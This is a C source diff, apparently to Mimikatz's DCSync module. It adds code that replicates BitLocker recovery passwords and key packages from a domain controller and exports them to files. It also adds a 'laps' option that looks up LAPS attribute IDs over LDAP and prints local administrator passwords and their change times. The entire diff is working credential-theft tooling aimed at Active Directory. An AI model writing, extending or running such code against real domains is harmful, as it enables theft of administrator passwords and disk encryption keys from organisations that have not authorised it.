@@ -16,6 +16,7 @@ LPCSTR kuhl_m_lsadump_dcsync_oids[] = {
 	szOID_ANSI_userAccountControl, szOID_ANSI_accountExpires, szOID_ANSI_pwdLastSet,
 	szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
 	szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
+	szOID_ANSI_msFVEKeyPackage, szOID_ANSI_msFVERecoveryGuid, szOID_ANSI_msFVEVolumeGuid, szOID_ANSI_msFVERecoveryPassword,
 	szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
 	szOID_ANSI_currentValue,
 	szOID_isDeleted,
@@ -25,6 +26,8 @@ LPCSTR kuhl_m_lsadump_dcsync_oids_export[] = {
 	szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
 	szOID_ANSI_userAccountControl,
 	szOID_ANSI_unicodePwd,
+	szOID_ANSI_msFVEKeyPackage, szOID_ANSI_msFVERecoveryGuid, szOID_ANSI_msFVEVolumeGuid, szOID_ANSI_msFVERecoveryPassword,
+	szOID_ANSI_currentValue,
 	szOID_isDeleted,
 };
 NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
@@ -35,7 +38,7 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	DRS_HANDLE hDrs = NULL;
 	DSNAME dsName = {0};
 	DRS_MSG_GETCHGREQ getChReq = {0};
-	DWORD dwOutVersion = 0, i, AuthnSvc;
+	DWORD dwOutVersion = 0, i, AuthnSvc, suppAtt = 0;
 	DRS_MSG_GETCHGREPLY getChRep;
 	ULONG drsStatus;
 	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL, szService;
@@ -43,6 +46,9 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	DRS_EXTENSIONS_INT DrsExtensionsInt;
 	BOOL someExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL), allData = kull_m_string_args_byName(argc, argv, L"all", NULL, NULL), csvOutput = kull_m_string_args_byName(argc, argv, L"csv", NULL, NULL), withDeleted = kull_m_string_args_byName(argc, argv, L"deleted", NULL, NULL), decodeUAC = kull_m_string_args_byName(argc, argv, L"uac", NULL, NULL), bAuthNtlm = kull_m_string_args_byName(argc, argv, L"authntlm", NULL, NULL);
 	SEC_WINNT_AUTH_IDENTITY secIdentity = {NULL, 0, NULL, 0, NULL, 0, SEC_WINNT_AUTH_IDENTITY_UNICODE};
+	PWCHAR dn;
+	PLDAP ld;
+	ATTRTYP SuppATT_IntId[2] = {0, 0}; // [0] msMcsAdmPwd, [1] msMcsAdmPwdExpirationTime
 
 	if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
@@ -68,6 +74,27 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 					kprintf(L"[DC] \'%s\' will be the user account\n", szUser);
 
 				kull_m_rpc_getArgs(argc, argv, NULL, NULL, NULL, &szService, L"ldap", &AuthnSvc, ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE), NULL, &secIdentity, NULL, TRUE);
+
+				if(kull_m_string_args_byName(argc, argv, L"laps", NULL, NULL))
+				{
+					if(kull_m_ldap_getLdapAndRootDN(szDc, L"schemaNamingContext", &ld, &dn, secIdentity.UserLength ? &secIdentity : NULL))
+					{
+						if(
+							kuhl_m_lsadump_dcsync_SearchAndParseLDAPToIntId(ld, dn, L"(&(objectclass=attributeSchema)(attributeID=" TEXT(szOID_ANSI_msMcsAdmPwd) L"))", SuppATT_IntId + 0)
+							&&
+							kuhl_m_lsadump_dcsync_SearchAndParseLDAPToIntId(ld, dn, L"(&(objectclass=attributeSchema)(attributeID=" TEXT(szOID_ANSI_msMcsAdmPwdExpirationTime) L"))", SuppATT_IntId + 1)
+							)
+						{
+							if(SuppATT_IntId[0] && SuppATT_IntId[1])
+							{
+								suppAtt = 2;
+							}
+						}
+						LocalFree(dn);
+						ldap_unbind(ld);
+					}
+				}
+
 				if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, bAuthNtlm ? RPC_C_AUTHN_WINNT : ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE), secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
 				{
 					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt))
@@ -82,10 +109,11 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 							getChReq.V8.cMaxBytes = 0x00a00000; // 10M
 							getChReq.V8.ulExtendedOp = (allData ? 0 : EXOP_REPL_OBJ);
 
-							if(getChReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT *) MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * ((allData ? ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export) : ARRAYSIZE(kuhl_m_lsadump_dcsync_oids)) - 1)))
+							if(getChReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT *) MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * (suppAtt + (allData ? ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export) : ARRAYSIZE(kuhl_m_lsadump_dcsync_oids)) - 1)))
 							{
 								getChReq.V8.pPartialAttrSet->dwVersion = 1;
 								getChReq.V8.pPartialAttrSet->dwReserved1 = 0;
+								
 								if(allData)
 								{
 									getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export);
@@ -98,6 +126,13 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 									for(i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
 										kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
 								}
+
+								if(suppAtt)
+								{
+									getChReq.V8.pPartialAttrSet->rgPartialAttr[getChReq.V8.pPartialAttrSet->cAttrs++] = SuppATT_IntId[0];
+									getChReq.V8.pPartialAttrSet->rgPartialAttr[getChReq.V8.pPartialAttrSet->cAttrs++] = SuppATT_IntId[1];
+								}
+
 								RpcTryExcept
 								{
 									do
@@ -116,7 +151,7 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 														if(csvOutput)
 															kuhl_m_lsadump_dcsync_descrObject_csv(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, withDeleted, decodeUAC);
 														else
-															kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, szDomain, someExport);
+															kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, szDomain, someExport, SuppATT_IntId, ARRAYSIZE(SuppATT_IntId));
 														pObject = pObject->pNextEntInf;
 													}
 												}
@@ -164,6 +199,51 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 		LsaFreeMemory(pPolicyDnsDomainInfo);
 
 	return STATUS_SUCCESS;
+}
+
+BOOL kuhl_m_lsadump_dcsync_SearchAndParseLDAPToIntId(PLDAP ld, PWCHAR dn, PWCHAR req, ATTRTYP *pIntId)
+{
+	BOOL status = FALSE;
+	PWCHAR myAttrs[] = {L"msDS-IntId", NULL};
+	DWORD ret;
+	PLDAPMessage pMessage = NULL, pEntry;
+	PBERVAL *pId;
+	PSTR tmpString;
+
+	ret = ldap_search_s(ld, dn, LDAP_SCOPE_ONELEVEL, req, myAttrs, FALSE, &pMessage);
+	if(ret == LDAP_SUCCESS)
+	{
+		if(ldap_count_entries(ld, pMessage) == 1)
+		{
+			if(pEntry = ldap_first_entry(ld, pMessage))
+			{
+				kprintf(L"[ldap] %s : ", ldap_get_dn(ld, pEntry));
+				pId = ldap_get_values_len(ld, pEntry, myAttrs[0]);
+				if(pId && pId[0])
+				{
+					if(tmpString = (PSTR) LocalAlloc(LPTR, pId[0]->bv_len + 1))
+					{
+						RtlCopyMemory(tmpString, pId[0]->bv_val, pId[0]->bv_len);
+						*pIntId = strtol(tmpString, NULL, 10);
+						kprintf(L"0x%08x\n", *pIntId);
+						status = TRUE;
+
+						LocalFree(tmpString);
+					}
+				}
+				else PRINT_ERROR(L"No values?\n");
+			}
+		}
+		else PRINT_ERROR(L"More than one entry?\n");
+	}
+	else PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", ret, ret);
+	
+	if(pMessage)
+	{
+		ldap_msgfree(pMessage);
+	}
+	
+	return status;
 }
 
 BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
@@ -233,12 +313,15 @@ void kuhl_m_lsadump_dcsync_descrObject_csv(SCHEMA_PREFIX_TABLE *prefixTable, ATT
 	}
 }
 
-void kuhl_m_lsadump_dcsync_descrObject(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCWSTR szSrcDomain, BOOL someExport)
+void kuhl_m_lsadump_dcsync_descrObject(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCWSTR szSrcDomain, BOOL someExport, ATTRTYP *pSuppATT_IntId, DWORD cSuppATT_IntId)
 {
 	kull_m_rpc_drsr_findPrintMonoAttr(L"\nObject RDN           : ", prefixTable, attributes, szOID_ANSI_name, TRUE);
+
 	kprintf(L"\n");
 	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, NULL, NULL))
-		kuhl_m_lsadump_dcsync_descrUser(prefixTable, attributes);
+		kuhl_m_lsadump_dcsync_descrUser(prefixTable, attributes, pSuppATT_IntId, cSuppATT_IntId);
+	else if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_msFVERecoveryGuid, NULL, NULL))
+		kuhl_m_lsadump_dcsync_descrBitlocker(prefixTable, attributes, someExport);
 	else if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_trustPartner, NULL, NULL))
 		kuhl_m_lsadump_dcsync_descrTrust(prefixTable, attributes, szSrcDomain);
 	else if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_currentValue, NULL, NULL))
@@ -292,7 +375,88 @@ LPCWSTR kuhl_m_lsadump_samAccountType_toString(DWORD accountType)
 	return target;
 }
 
-void kuhl_m_lsadump_dcsync_descrUser(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes)
+void kuhl_m_lsadump_dcsync_descrBitlocker(SCHEMA_PREFIX_TABLE* prefixTable, ATTRBLOCK* attributes, BOOL someExport)
+{
+	UNICODE_STRING uString = {0};
+	DWORD szData = 0;
+	PVOID data = 0;
+	GUID RecoveryGuid;
+	PWCHAR filename;
+
+	kprintf(L"** BITLOCKER RECOVERY INFORMATION **\n\n");
+
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_msFVEVolumeGuid, &data, NULL))
+	{
+		kprintf(L"Volume GUID          : ");
+		kull_m_string_displayGUID((LPCGUID) data);
+		kprintf(L"\n");
+	}
+
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_msFVERecoveryGuid, &RecoveryGuid, NULL))
+	{
+		kprintf(L"Recovery GUID        : ");
+		kull_m_string_displayGUID(&RecoveryGuid);
+		kprintf(L"\n");
+	}
+	else
+	{
+		UuidCreate(&RecoveryGuid);
+		if(someExport)
+		{
+			kprintf(L"Recovery GUID (fake) : ");
+			kull_m_string_displayGUID(&RecoveryGuid);
+			kprintf(L"\n");
+		}
+	}
+
+	if(someExport)
+	{
+		RtlStringFromGUID(&RecoveryGuid, &uString);
+	}
+
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_msFVERecoveryPassword, &data, &szData))
+	{
+		if(szData > 0)
+		{
+			kprintf(L"Recovery Password    : %s\n", data);
+
+			if(someExport)
+			{
+				if(filename = kuhl_m_crypto_generateFileName(L"ntds", L"bitlocker", 0, uString.Buffer ? uString.Buffer : L"(noguid)", L"recoveryPassword"))
+				{
+					kprintf(L"\tExport         : %s - \'%s\'\n", kull_m_file_writeData(filename, (PBYTE)data, szData) ? L"OK" : L"KO", filename);
+					LocalFree(filename);
+				}
+			}
+		}
+	}
+
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_msFVEKeyPackage, &data, &szData))
+	{
+		if(szData > 0)
+		{
+			kprintf(L"Key Package Size     : %u byte(s)\nKey Package          : [", szData);
+			kull_m_string_wprintf_hex(data, szData, 0);
+			kprintf(L"]\n");
+
+			if (someExport)
+			{
+				if(filename = kuhl_m_crypto_generateFileName(L"ntds", L"bitlocker", 0, uString.Buffer ? uString.Buffer : L"(noguid)", L"keyPackage"))
+				{
+					kprintf(L"\tExport         : %s - \'%s\'\n", kull_m_file_writeData(filename, (PBYTE)data, szData) ? L"OK" : L"KO", filename);
+					LocalFree(filename);
+				}
+			}
+		}
+	}
+
+	if (uString.Buffer)
+	{
+		RtlFreeUnicodeString(&uString);
+	}
+}
+
+void kuhl_m_lsadump_dcsync_descrUser(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, ATTRTYP *pSuppATT_IntId, DWORD cSuppATT_IntId)
 {
 	DWORD rid = 0, i;
 	PBYTE encodedData;
@@ -364,6 +528,21 @@ void kuhl_m_lsadump_dcsync_descrUser(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK
 	{
 		kprintf(L"\nSupplemental Credentials:\n");
 		kuhl_m_lsadump_dcsync_descrUserProperties((PUSER_PROPERTIES) encodedData);
+	}
+
+	if((cSuppATT_IntId >= 2) && pSuppATT_IntId[0] && pSuppATT_IntId[1])
+	{
+		kprintf(L"LAPS:\n");
+		if(kull_m_rpc_drsr_findMonoAttrNoOID(attributes, pSuppATT_IntId[0], &encodedData, &encodedDataSize))
+		{
+			kprintf(L"  Password   : %.*S\n", encodedDataSize, encodedData);
+		}
+		if(kull_m_rpc_drsr_findMonoAttrNoOID(attributes, pSuppATT_IntId[1], &data, NULL))
+		{
+			kprintf(L"  Last change: ");
+			kull_m_string_displayLocalFileTime((LPFILETIME) data);
+			kprintf(L"\n");
+		}
 	}
 }
 
@@ -2096,7 +2275,6 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication(PDCSHADOW_DOMAIN_INFO info)
 				kprintf(L"    uidOriginatingDsa:");
 				kull_m_string_displayGUID(&attr->MetaData.uidOriginatingDsa);
 				kprintf(L"\n");
-				
 			}
 			kprintf(L"\n");
 		}
